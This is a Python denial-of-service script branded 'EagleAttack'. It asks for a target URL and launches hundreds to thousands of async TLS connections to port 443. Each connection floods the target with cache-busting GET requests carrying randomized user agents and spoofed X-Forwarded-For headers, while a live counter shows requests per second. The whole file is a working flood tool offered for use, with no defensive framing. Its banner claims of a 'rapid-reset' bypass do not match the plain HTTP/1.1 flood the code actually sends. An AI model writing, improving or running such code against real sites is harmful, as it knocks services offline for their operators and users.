import asyncio
import random
import ssl
import sys
import time
import os
from colorama import Fore, init
init(autoreset=True)

class EagleAttack:
    def __init__(self):
        self.owner = "𝐄𝐀𝐆𝐋𝐄"
        self.sent = 0
        self.start_time = time.time()
        self.is_running = True

    def banner(self):
        os.system('clear')
        print(f""" {Fore.RED} .─────────────────────────────────────────────────────────────. {Fore.RED} │{Fore.RED} ██╗ ██╗ ██████╗ ██╗██████╗ ██╗ ██╗██╗ ██████╗ {Fore.RED}│ {Fore.RED} │{Fore.WHITE} ██║ ██║██╔═══██╗██║██╔══██╗ ██║ ██║██║██╔═══██╗ {Fore.RED}│ {Fore.RED} │{Fore.WHITE} ██║ ██║██║ ██║██║██║ ██║ ██║ ██║██║██║ ██║ {Fore.RED}│ {Fore.RED} │{Fore.RED} ╚██╗ ██╔╝██║ ██║██║██║ ██║ ╚██╗ ██╔╝██║██║ ██║ {Fore.RED}│ {Fore.RED} │{Fore.RED} ╚████╔╝ ╚██████╔╝██║██████╔╝ ╚████╔╝ ██║╚██████╔╝ {Fore.RED}│ {Fore.RED} │{Fore.RED} ╚═══╝ ╚═════╝ ╚═╝╚═════╝ ╚═══╝ ╚═╝ ╚═════╝ {Fore.RED}│ {Fore.RED} '─────────────────────────────────────────────────────────────' {Fore.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ {Fore.WHITE} NAME : {Fore.YELLOW}𝐄𝐀𝐆𝐋𝐄 𝐀𝐓𝐓𝐀𝐂𝐊  {Fore.WHITE} | {Fore.RED}MODE : KERNEL-STRESS {Fore.WHITE} BYPASS : {Fore.MAGENTA}RAPID-RESET L7 {Fore.WHITE} | {Fore.GREEN}ANON : MY EAGLE {Fore.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

    async def attack_engine(self, host, port, path):
        """Asynchronous Zero-Copy Packet Injection"""
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        while self.is_running:
            try:
                reader, writer = await asyncio.open_connection(host, port, ssl=ssl_context)
                for _ in range(500):
                    payload = (
                        f"GET {path}?{random.getrandbits(32)} HTTP/1.1\r\n"
                        f"Host: {host}\r\n"
                        f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/{random.randint(120, 126)}.0.0.0\r\n"
                        f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
                        f"Accept-Encoding: gzip, deflate, br\r\n"
                        f"Connection: keep-alive\r\n\r\n"
                    ).encode()
                    writer.write(payload)
                    await writer.drain()
                    self.sent += 1
                await asyncio.sleep(0.01)
                writer.close()
                await writer.wait_closed()
            except:
                await asyncio.sleep(0.01)

    async def dashboard(self):
        while self.is_running:
            elapsed = time.time() - self.start_time
            rps = round(self.sent / elapsed) if elapsed > 0 else 0
            sys.stdout.write(
                f"\r{Fore.WHITE}[ {Fore.RED}EAGLE-RAGE {Fore.WHITE}] "
                f"SENT: {Fore.GREEN}{self.sent:,} "
                f"{Fore.WHITE}| RPS: {Fore.YELLOW}{rps:,} "
                f"{Fore.WHITE}| SHADOW: {Fore.MAGENTA}ACTIVE"
            )
            sys.stdout.flush()
            await asyncio.sleep(0.5)

    async def launch(self):
        self.banner()
        target = input(f"{Fore.CYAN}┌──({Fore.WHITE}TARGET URL/DOMAIN{Fore.CYAN})\n└─╼ {Fore.WHITE}")
        power = int(input(f"{Fore.CYAN}┌──({Fore.WHITE}EAGLE CLUSTERS (Rec: 500-2000){Fore.CYAN})\n└─╼ {Fore.WHITE}"))
        host = target.replace("http://", "").replace("https://", "").split("/")[0]
        path = "/" if "/" not in target.split(host)[-1] else target.split(host)[-1]
        print(f"\n{Fore.RED}[!] EAGLE PROTOCOL INITIALIZED. TARGETING INFRASTRUCTURE...")
        tasks = [asyncio.create_task(self.dashboard())]
        for _ in range(power):
            tasks.append(asyncio.create_task(self.attack_engine(host, 443, path)))
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    app = EagleAttack()
    try:
        asyncio.run(app.launch())
    except KeyboardInterrupt:
        app.is_running = False
        print(f"\n\n{Fore.RED}[!] EAGLE PROTOCOL HALTED.")